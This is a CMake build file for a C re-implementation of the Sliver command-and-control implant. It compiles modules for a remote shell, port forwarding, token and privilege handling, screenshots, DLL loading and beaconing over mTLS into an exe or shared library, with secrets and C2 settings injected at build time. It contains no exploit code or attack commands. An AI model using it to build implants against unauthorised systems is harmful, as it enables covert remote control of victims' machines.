cmake_minimum_required(VERSION 3.25)

project(sliver_implant
  VERSION 0.1.0
  DESCRIPTION "C/C++ re-implementation of the Sliver implant runtime"
  LANGUAGES C)

list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_LIST_DIR}/cmake")
include(SliverOptions)
include(SliverWarnings)

option(IMPLANT_CRYPTO "Build the crypto layer (mbedTLS + monocypher)" ON)

# ---------------------------------------------------------------------------
# Crypto backend: mbedTLS 3.6 (TLS 1.3, SHA-256, HKDF, ChaCha20-Poly1305,
# X25519) with a trimmed configuration, plus monocypher for Ed25519/BLAKE2b.
# ---------------------------------------------------------------------------
if(IMPLANT_CRYPTO)
  set(MBEDTLS_DIR "${CMAKE_CURRENT_LIST_DIR}/third_party/mbedtls")
  if(NOT EXISTS "${MBEDTLS_DIR}/library/ssl_debug_helpers_generated.c")
    message(FATAL_ERROR
      "third_party/mbedtls is missing or incomplete. It must be the official "
      "mbedTLS 3.6.8 release tree (include/ + library/, which ships the "
      "generated sources) so no Python/Perl code generation is required.")
  endif()
  # Compile the vendored mbedTLS directly: its own CMake would run config.py
  # (Python + jsonschema) and driver-wrapper generation (Perl), which a payload
  # build machine should not need. The release tree already contains the
  # generated sources.
  file(GLOB MBEDTLS_SOURCES CONFIGURE_DEPENDS "${MBEDTLS_DIR}/library/*.c")
  add_library(mbedtls_vendor STATIC ${MBEDTLS_SOURCES})
  target_include_directories(mbedtls_vendor
    PUBLIC  "${MBEDTLS_DIR}/include"
    PRIVATE "${MBEDTLS_DIR}/library")
  target_compile_definitions(mbedtls_vendor PRIVATE
    MBEDTLS_CONFIG_FILE="${CMAKE_CURRENT_LIST_DIR}/cmake/sliver_mbedtls_config.h")
  # third-party code: no project warning policy
  if(MSVC)
    target_compile_options(mbedtls_vendor PRIVATE /W0)
  else()
    target_compile_options(mbedtls_vendor PRIVATE -w)
  endif()
  set_target_properties(mbedtls_vendor PROPERTIES POSITION_INDEPENDENT_CODE ON)
  if(WIN32)
    # entropy_poll uses BCryptGenRandom
    target_link_libraries(mbedtls_vendor PUBLIC bcrypt)
  endif()

  add_library(sliver_crypto STATIC
    src/crypto/crypto_mbedtls.c
    src/crypto/ed25519_blake2b.c
    src/crypto/bech32.c
    src/crypto/age.c
    src/crypto/minisign.c
    third_party/monocypher/monocypher.c
    third_party/ed25519/add_scalar.c
    third_party/ed25519/fe.c
    third_party/ed25519/ge.c
    third_party/ed25519/key_exchange.c
    third_party/ed25519/keypair.c
    third_party/ed25519/sc.c
    third_party/ed25519/seed.c
    third_party/ed25519/sha512.c
    third_party/ed25519/sign.c
    third_party/ed25519/verify.c
  )
  target_include_directories(sliver_crypto
    PUBLIC "${CMAKE_CURRENT_LIST_DIR}/include"
    PRIVATE "${CMAKE_CURRENT_LIST_DIR}/third_party/monocypher"
            "${CMAKE_CURRENT_LIST_DIR}/third_party/ed25519")
  target_link_libraries(sliver_crypto PUBLIC mbedtls_vendor)
  set_target_properties(sliver_crypto PROPERTIES POSITION_INDEPENDENT_CODE ON)
  sliver_apply_warnings(sliver_crypto)
endif()

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)
set(CMAKE_C_EXTENSIONS OFF)

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin")
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin")
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib")
foreach(cfg IN ITEMS DEBUG RELEASE RELWITHDEBINFO MINSIZEREL)
  set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_${cfg} "${CMAKE_BINARY_DIR}/bin")
  set(CMAKE_LIBRARY_OUTPUT_DIRECTORY_${cfg} "${CMAKE_BINARY_DIR}/bin")
endforeach()

find_package(Threads REQUIRED)

# ---------------------------------------------------------------------------
# 1) Build-time configuration injection (replaces Go's text/template stage)
# ---------------------------------------------------------------------------
set(SLIVER_GEN_DIR "${CMAKE_BINARY_DIR}/generated")
file(MAKE_DIRECTORY "${SLIVER_GEN_DIR}")

string(RANDOM LENGTH 16 ALPHABET 0123456789abcdef SLIVER_BUILD_SEED)

execute_process(
  COMMAND "${CMAKE_COMMAND}"
          "-DCFG_JSON=${SLIVER_CONFIG_JSON}"
          "-DOUT_DIR=${SLIVER_GEN_DIR}"
          "-DBUILD_SEED=${SLIVER_BUILD_SEED}"
          "-DDEBUG_LOG=${IMPLANT_DEBUG_LOG}"
          -P "${CMAKE_CURRENT_LIST_DIR}/cmake/SliverConfigGen.cmake"
  RESULT_VARIABLE _cfg_result
  OUTPUT_VARIABLE _cfg_out
  ERROR_VARIABLE _cfg_err)
if(NOT _cfg_result EQUAL 0)
  message(FATAL_ERROR "config generation failed:\n${_cfg_out}\n${_cfg_err}")
endif()
message(STATUS "sliver build seed: ${SLIVER_BUILD_SEED}")

# ---------------------------------------------------------------------------
# 2) Core library (protocol/crypto/transport/platform land here in M1+)
# ---------------------------------------------------------------------------
set(SLIVER_CORE_SOURCES
  src/core/config.c
  src/core/log.c
  src/core/fileio.c
  src/proto/proto.c
  src/proto/domain_enc.c
  src/platform/${SLIVER_PLATFORM_DIR}/thread.c
  src/platform/${SLIVER_PLATFORM_DIR}/net.c
  src/platform/${SLIVER_PLATFORM_DIR}/fs.c
  src/platform/${SLIVER_PLATFORM_DIR}/proc.c
  src/platform/${SLIVER_PLATFORM_DIR}/exec.c
  src/platform/${SLIVER_PLATFORM_DIR}/registry.c
  src/platform/${SLIVER_PLATFORM_DIR}/screenshot.c
  src/platform/${SLIVER_PLATFORM_DIR}/privs.c
  src/platform/${SLIVER_PLATFORM_DIR}/services.c
  src/platform/${SLIVER_PLATFORM_DIR}/token.c
  src/platform/${SLIVER_PLATFORM_DIR}/dllload.c
)
if(IMPLANT_CRYPTO)
  list(APPEND SLIVER_CORE_SOURCES
    src/transport/tls_client.c
    src/transport/transport.c
    src/transport/channel_mtls.c
    src/wire/frame.c
    src/wire/yamux.c
    src/modes/session.c
    src/modes/implant.c
    src/modes/beacon.c
    src/rpc/dispatch.c
    src/modes/shell.c
    src/modes/portfwd.c)
endif()

add_library(sliver_core STATIC ${SLIVER_CORE_SOURCES} "${SLIVER_GEN_DIR}/implant_secrets.c"
    "${SLIVER_GEN_DIR}/implant_http_c2.c")
target_include_directories(sliver_core
  PUBLIC  "${CMAKE_CURRENT_LIST_DIR}/include"
  PRIVATE "${SLIVER_GEN_DIR}")
target_link_libraries(sliver_core PUBLIC Threads::Threads)
if(IMPLANT_CRYPTO)
  target_link_libraries(sliver_core PUBLIC sliver_crypto)
endif()
# PIC is required when the SHARED artifact links this static library.
set_target_properties(sliver_core PROPERTIES POSITION_INDEPENDENT_CODE ON)
if(WIN32)
  target_link_libraries(sliver_core PUBLIC ws2_32 iphlpapi windowscodecs ole32 advapi32)
endif()
sliver_apply_warnings(sliver_core)
target_compile_definitions(sliver_core PRIVATE _CRT_SECURE_NO_WARNINGS
  SLIVER_BUILD_SEED="${SLIVER_BUILD_SEED}"
  $<$<BOOL:${WIN32}>:_WIN32_WINNT=0x0601;WIN32_LEAN_AND_MEAN;NOMINMAX>)

# ---------------------------------------------------------------------------
# 3) Artifact(s)
# ---------------------------------------------------------------------------
if(IMPLANT_FORMAT STREQUAL "exe")
  # tls/frame/yamux/session/beacon are gated on IMPLANT_CRYPTO. Building an exe
  # without them yields a binary that starts, does nothing and never connects,
  # which cannot be diagnosed from the artifact itself: fail at configure time.
  if(NOT IMPLANT_CRYPTO)
    message(FATAL_ERROR
      "IMPLANT_CRYPTO=OFF cannot produce a runnable exe implant (the TLS/yamux/"
      "session/beacon sources are gated on it). Use -DIMPLANT_CRYPTO=ON (default).")
  endif()
  add_executable(implant src/entry/main.c)
  if(IMPLANT_CRYPTO)
    target_compile_definitions(implant PRIVATE IMPLANT_CRYPTO_ENABLED=1 _CRT_SECURE_NO_WARNINGS)
  endif()
  target_link_libraries(implant PRIVATE sliver_core)
  sliver_apply_warnings(implant)
  if(WIN32 AND IMPLANT_GUI)
    set_target_properties(implant PROPERTIES WIN32_EXECUTABLE TRUE)
    # GUI subsystem needs WinMain; main.c provides it under this definition.
    target_compile_definitions(implant PRIVATE IMPLANT_GUI_BUILD=1)
  endif()
elseif(IMPLANT_FORMAT STREQUAL "shared")
  add_library(implant SHARED src/entry/dllmain.c)
  target_link_libraries(implant PRIVATE sliver_core)
  target_compile_definitions(implant PRIVATE IMPLANT_BUILD_DLL=1 _CRT_SECURE_NO_WARNINGS)
  if(IMPLANT_CRYPTO)
    target_compile_definitions(implant PRIVATE IMPLANT_CRYPTO_ENABLED=1)
  endif()
  sliver_apply_warnings(implant)
  set_target_properties(implant PROPERTIES PREFIX "" OUTPUT_NAME "implant")
else()
  message(FATAL_ERROR "unknown IMPLANT_FORMAT='${IMPLANT_FORMAT}'")
endif()

# ---------------------------------------------------------------------------
# 4) Tests
# ---------------------------------------------------------------------------
include(CTest)
if(BUILD_TESTING)
  add_subdirectory(tests)
endif()

message(STATUS "sliver_implant: format=${IMPLANT_FORMAT} platform=${SLIVER_PLATFORM_DIR} compiler=${CMAKE_C_COMPILER_ID}")






















